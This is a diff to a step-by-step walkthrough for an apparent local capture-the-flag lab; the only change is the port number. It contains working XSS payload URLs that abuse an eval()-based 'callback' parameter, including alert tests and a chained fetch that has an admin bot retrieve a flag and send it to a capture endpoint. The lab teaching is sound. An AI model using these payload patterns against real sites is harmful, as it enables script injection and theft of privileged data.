@@ -61,7 +61,7 @@ Player crafts URL with XSS payload
 Navigate to the Knowledge Base (`/kb`) and try adding a `callback` parameter:
 
 ```
-http://localhost:5174/kb?search=test&callback=alert(1)
+http://localhost:5176/kb?search=test&callback=alert(1)
 ```
 
 You should see an `alert(1)` pop up, confirming arbitrary JavaScript execution via `eval()`.
@@ -77,7 +77,7 @@ Submit a simple report that exfiltrates data to confirm the bot is actually exec
 1. Go to **Report** page (`/report`)
 2. Submit this URL:
 ```
-http://localhost:5174/kb?search=test&callback=fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:'bot_was_here',reportId:'test'})})
+http://localhost:5176/kb?search=test&callback=fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:'bot_was_here',reportId:'test'})})
 ```
 3. After a few seconds, go to **My Captures** page (`/captures`)
 4. You should see an entry with `data: 'bot_was_here'` — confirming the bot executed your payload
@@ -95,7 +95,7 @@ After submitting a report, the **Report** page shows a card for each report with
 
 **Look at the "Bot visited URL" field** — it will show the exact URL the bot visited, including the `_reportId` query parameter appended by the bot.
 
-Example: `http://localhost:5174/kb?search=test&callback=...&_reportId=7`
+Example: `http://localhost:5176/kb?search=test&callback=...&_reportId=7`
 
 **Rationale:** The `_reportId` is automatically appended by the bot when visiting your URL. By viewing the report card, you can see the exact query string the bot used, revealing the `_reportId` value without needing to exfiltrate the URL yourself.
 
@@ -106,7 +106,7 @@ Example: `http://localhost:5174/kb?search=test&callback=...&_reportId=7`
 Try to access the flag endpoint directly from the main app (the Vite dev server proxies all `/api` routes to the backend):
 
 ```
-http://localhost:5174/api/admin/flag?reportId=1
+http://localhost:5176/api/admin/flag?reportId=1
 ```
 
 You can also hit it from the browser DevTools console while on the site:
@@ -208,7 +208,7 @@ The `.concat()` method is literally in the source code so it survives URL encodi
 
 **Safe version** (ready to copy-paste into the Report form):
 ```
-http://localhost:5174/kb?search=test&callback=fetch('/api/admin/flag?reportId='.concat(new URLSearchParams(location.search).get('_reportId'))).then(function(r){return r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new URLSearchParams(location.search).get('_reportId')})})})
+http://localhost:5176/kb?search=test&callback=fetch('/api/admin/flag?reportId='.concat(new URLSearchParams(location.search).get('_reportId'))).then(function(r){return r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new URLSearchParams(location.search).get('_reportId')})})})
 ```
 
 Steps to submit:
@@ -292,12 +292,12 @@ If your payload has `+` in it (like `a+b`), it will be decoded as a space in `ev
 
 **Simple test (verify XSS works):**
 ```
-http://localhost:5174/kb?search=test&callback=document.title='HACKED'
+http://localhost:5176/kb?search=test&callback=document.title='HACKED'
 ```
 
 **Alert with cookie (confirms httpOnly is set — cookie will be empty):**
 ```
-http://localhost:5174/kb?search=test&callback=alert(document.cookie)
+http://localhost:5176/kb?search=test&callback=alert(document.cookie)
 ```
 
 ---
